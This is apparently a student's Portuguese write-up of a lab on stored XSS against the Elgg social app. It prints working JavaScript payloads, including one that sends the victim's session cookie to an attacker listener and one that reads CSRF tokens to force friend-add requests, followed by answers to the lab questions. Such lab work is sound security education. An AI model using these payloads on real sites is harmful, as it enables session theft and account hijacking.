TASK 1:
- Ao editar a bio, no campo About Me ativamos "Edit HTML" e colocamos: <script>alert('XSS');</script>
- Pode ser visualizada atraves da task1.png a resolução, depois de ter-mos dado login atraves da Alice



TASK 2:
- Na bio da Samy colocamos: <script>alert(document.cookie);</script>
- É possivel verificar atraves da task2.png o sucesso da mesma, quando da-mos login atraves da Alice o script conseguiu ler o document.cookie



TASK 3:
- Atualizamos a bio da Samy para:
<script>
document.write('<img src="http://127.0.0.1:5555?c=' + encodeURIComponent(document.cookie) + '">');
</script>
- O payload XSS foi armazenado no perfil do Samy, quando a vítima visitou o perfil, o script criou um pedido HTTP para o host do atacante, sendo que o cookie de sessão foi incluído na query string.
- Através da task3.png podemos confirmar que no terminal atacante é possivel observar o GET



TASK 4:
- Eliminamos agora a bio da Samy, e, atraves do login da Alice, adicionámos normalmente como amigo a Samy, de forma a através das devtools do browser aceder ao request, que neste caso deu-nos isto:
{output: "", status: 0,…}
current_url
: 
"http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1776262492&__elgg_token=08HW-Y1X8xkKAPxx4TTACQ&__elgg_ts=1776262492&__elgg_token=08HW-Y1X8xkKAPxx4TTACQ"
forward_url
: 
"http://www.seed-server.com/profile/samy"
output
: 
""
status
: 
0
system_messages
: 
{error: [], success: ["You have successfully added Samy as a friend."]}
error
: 
[]
success
: 
["You have successfully added Samy as a friend."]

- Depois disto, voltamos a alterar a bio do samy, desta vez para:
<script>
window.onload = function () {
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;

    var Ajax = null;
    if (window.XMLHttpRequest) {
        Ajax = new XMLHttpRequest();
    } else {
        Ajax = new ActiveXObject("Microsoft.XMLHTTP");
    }

    Ajax.open("GET", sendurl, true);
    Ajax.send();
}
</script>

- Assim conseguimos ir buscar os tokens da sessão da vítima, contruir o url válido para o Elgg e enviar automaticamente o GET para adicionar o Samy como amigo, que no caso é o "friend=59".
- Vamos agora entrar num login diferente, no nosso caso utilizamos o login do charlie, e só de entrar no perfil do samy ele automaticamente adiciona como amigo, confirmando assim que o ataque funcionou, podendo ser confirmado através da task4.png que o samy já aparece na friends list do charlie.


Q1:
- As linhas com __elgg_ts e __elgg_token são necessárias porque o Elgg exige esses valores para validar ações sensíveis, estes tokens funcionam pois estão associados à sessão autenticada do utilizador. O script malicioso que criamos, ao correr no browser da vítima, consegue lê-los e incluí-los no pedido forjado fazendo com que o servidor aceite a ação como legítima


Q2:
- A ação é executada com os privilégios da vítima porque o código js corre no browser da vítima. Assim o pedido é enviado juntamente com o cookie de sessão da vítima e com tokens válidos da sua sessão. Desta forma, do ponto de vista do servidor o pedido parece ter sido iniciado pelo próprio utilizador autenticado.


Q3:
- Este ataque é principalmente um caso de Stored XSS, porque o código malicioso fica armazenado no perfil do samy no servidor e é executado quando outras vítimas visitam essa página. Não é reflected XSS porque não depende de input refletido numa resposta imediata. Também não é um caso de DOM XSS porque a carga maliciosa tem origem no conteúdo persistido no servidor.



